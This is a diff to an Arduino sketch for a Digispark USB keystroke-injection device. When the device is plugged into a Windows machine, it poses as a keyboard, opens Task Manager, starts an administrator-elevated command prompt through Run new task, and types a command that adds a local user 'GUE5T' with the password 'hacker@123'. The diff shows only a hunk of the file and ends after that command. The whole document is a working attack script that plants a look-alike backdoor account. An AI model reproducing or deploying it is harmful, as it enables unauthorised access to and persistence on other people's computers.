@@ -1,20 +1,25 @@
 
 #include "DigiKeyboard.h"
+#define KEY_TAB 0x2b
 
 void setup()
 {
+  DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(3000);
+ 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.println("taskmgr");
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
+  DigiKeyboard.sendKeyStroke(KEY_A, MOD_ALT_LEFT); 
+  DigiKeyboard.sendKeyStroke(KEY_N);
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_TAB); 
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(200);
   DigiKeyboard.println("net user GUE5T hacker@123 /add");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
